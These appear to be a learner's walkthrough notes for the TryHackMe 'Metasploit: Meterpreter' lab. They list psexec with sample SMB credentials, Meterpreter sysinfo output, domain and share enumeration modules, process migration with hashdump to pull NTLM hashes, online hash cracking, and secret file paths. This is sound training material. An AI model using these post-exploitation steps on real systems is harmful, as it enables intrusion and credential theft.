# Metasploit: Meterpreter
Link: https://tryhackme.com/room/meterpreter


msf5 exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf5 exploit(windows/smb/psexec) > set SMBUser ballen
SMBUser => ballen
msf5 exploit(windows/smb/psexec) > run


meterpreter > sysinfo
Computer        : HelloWorld
<!-- Computer        : ACME-TEST -->
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 8
Meterpreter     : x86/windows
meterpreter > 

What is the computer name?


What is the target domain?

use post/windows/gather/enum_domain


What is the name of the share likely created by the user?

use post/windows/gather/enum_shares


What is the NTLM hash of the jchambers user?

migrate 772
hashdump

What is the cleartext password of the jchambers user?

https://crackstation.net/

Where is the "secrets.txt"  file located?

c:\Program Files (x86)\Windows Multimedia Platform\
What is the Twitter password revealed in the "secrets.txt" file?


Where is the "realsecret.txt" file located?

c:\inetpub\wwwroot\
What is the real secret?


